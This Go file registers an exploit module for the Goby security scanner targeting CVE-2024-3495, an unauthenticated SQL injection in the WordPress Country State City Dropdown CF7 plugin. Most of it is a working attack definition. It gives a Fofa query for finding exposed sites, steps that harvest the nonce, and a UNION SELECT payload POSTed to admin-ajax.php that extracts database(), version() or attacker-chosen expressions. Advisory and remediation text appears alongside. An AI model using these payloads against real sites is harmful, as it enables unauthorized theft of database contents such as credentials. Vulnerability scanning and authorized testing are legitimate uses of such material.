package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "WordPress-Dropdown-CF7 /wp-admin/admin-ajax.php SQL Injection Vulnerability(CVE-2024-3495)",
    "Description": "<p>The Country State City Dropdown CF7 plugin is a powerful and easy-to-use WordPress plugin that provides users with a three-level drop-down menu of country, state/province, and city in the contact form, helping users to fill in regional information more accurately. At the same time, the team and support for plugins are also excellent, providing users with high-quality services.Due to the SQL injection vulnerability in the Country State City Dropdown CF7 plugin for WordPress in versions 2.7.2 and below, unauthenticated remote attackers can exploit this vulnerability to obtain sensitive database information, resulting in the leakage of credentials, keys, and other information. Further exploitation may also pose a serious threat to the server.</p>",
    "Product": "wordpress",
    "Homepage": "https://wordpress.org/",
    "DisclosureDate": "2024-11-12",
    "PostTime": "2024-12-03",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/wp-content/plugins/country-state-city-auto-dropdown/\" && body=\"/wp-json/wp/\"",
    "GobyQuery": "body=\"/wp-content/plugins/country-state-city-auto-dropdown/\" && body=\"/wp-json/wp/\"",
    "Level": "2",
    "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.</p>",
    "Recommendation": "<p>1. The manufacturer has released the latest security version, please follow the official website <a href=\"https://sg.wordpress.org/\">https://sg.wordpress.org/</a> </p><p> 2. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p> 3. Close the Internet exposure or set the access rights of the interface to upgrade the plug-in to the security version</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/WordPress/WordPress-Dropdown-CF7%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-3495).md#wordpress-dropdown-cf7%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2024-3495"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "database()",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "database(),version()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "nonce|lastbody|regex|\"nonce\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
                    "Content-Length": "114",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=tc_csca_get_cities&nonce_ajax={{{nonce}}}&sid=1+or+0+union+select+concat(0x76616c75653a,md5({{{rand6}}})),2,3--+-"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand6_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "nonce|lastbody|regex|\"nonce\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
                    "Content-Length": "114",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=tc_csca_get_cities&nonce_ajax={{{nonce}}}&sid=1+or+0+union+select+concat(0x76616c75653a,{{{payload_url}}}),2,3--+-"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"value:(.*?)\"",
                "output|when|attackType=sqlpoint|{{{lastreq}}} action=tc_csca_get_cities&nonce_ajax={{{nonce}}}&sid=1+or+0+union+select+concat(0x76616c75653a,database()),2,3--+-"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-3495"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "WordPress-Dropdown-CF7 /wp-admin/admin-ajax.php SQL 注入漏洞（CVE-2024-3495）",
            "Product": "wordpress",
            "Description": "<p>Country State City Dropdown CF7插件是一个功能强大、易于使用的WordPress插件，它为用户在联系表单中提供国家、州/省和城市的三级下拉菜单功能，帮助用户更准确地填写地区信息。同时，插件的团队和支持也非常出色，为用户提供高质量的服务。<br></p><p>由于WordPress的Country State City Dropdown CF7插件在2.7.2及以下的版本中存在SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞获取数据库敏感信息，导致凭证密钥等信息泄露，深入利用还可能会对服务器造成严重威胁。<br></p>",
            "Recommendation": "<p>1、该厂商已经发布最新安全版本，关注官网&nbsp;<a href=\"https://sg.wordpress.org/\">https://sg.wordpress.org/</a></p><p>2、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。<br></p><p>3、关闭互联网暴露面或接口设置访问权限将插件升级至安全版本</p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress-Dropdown-CF7 /wp-admin/admin-ajax.php SQL Injection Vulnerability(CVE-2024-3495)",
            "Product": "wordpress",
            "Description": "<p>The Country State City Dropdown CF7 plugin is a powerful and easy-to-use WordPress plugin that provides users with a three-level drop-down menu of country, state/province, and city in the contact form, helping users to fill in regional information more accurately. At the same time, the team and support for plugins are also excellent, providing users with high-quality services.Due to the SQL injection vulnerability in the Country State City Dropdown CF7 plugin for WordPress in versions 2.7.2 and below, unauthenticated remote attackers can exploit this vulnerability to obtain sensitive database information, resulting in the leakage of credentials, keys, and other information. Further exploitation may also pose a serious threat to the server.<br></p>",
            "Recommendation": "<p>1. The manufacturer has released the latest security version, please follow the official website <a href=\"https://sg.wordpress.org/\">https://sg.wordpress.org/</a>&nbsp;</p><p>&nbsp;2. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>&nbsp;3. Close the Internet exposure or set the access rights of the interface to upgrade the plug-in to the security version<br></p>",
            "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand6": "define|variable|{{{rand|int|6}}}",
        "rand6_md5": "define|md5|{{{rand6}}}",
        "payload_url": "define|variable|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "rand6",
        "rand6_md5",
        "payload_url"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }